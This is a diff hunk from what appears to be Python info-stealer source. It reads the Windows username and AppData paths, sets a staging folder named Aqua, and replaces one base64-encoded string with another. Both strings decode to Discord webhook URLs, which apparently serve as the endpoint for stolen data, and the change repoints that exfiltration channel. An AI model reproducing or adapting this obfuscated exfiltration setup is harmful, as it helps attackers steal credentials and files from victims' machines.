@@ -29,7 +29,7 @@ user = os.environ.get("USERNAME")
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 Aqua = "C:/Users/Public/Aqua"
-build = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyNzU5MjI2NDYwODY0OTI5OC8wMmE2ZTVqSjhfbmxXdVFwRlRzZURFeHl1dGVlZVIwa05kVzNFZ191RkIwM2I1YUtTUVhZWnNFS0V4cjhJRjJHclRJcA=="
+build = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyODc2MDEzNTI5NjQ4NzQyNi9PUkVSaERQZ01Ka3JqUVhjVmdzdDlBM0VOb2FobTdIYVNDY0tTMTdlMC1SZGxwVnE3NTFPTkNPZVAyaEozNjI4RkRtUg=="
 
 
 
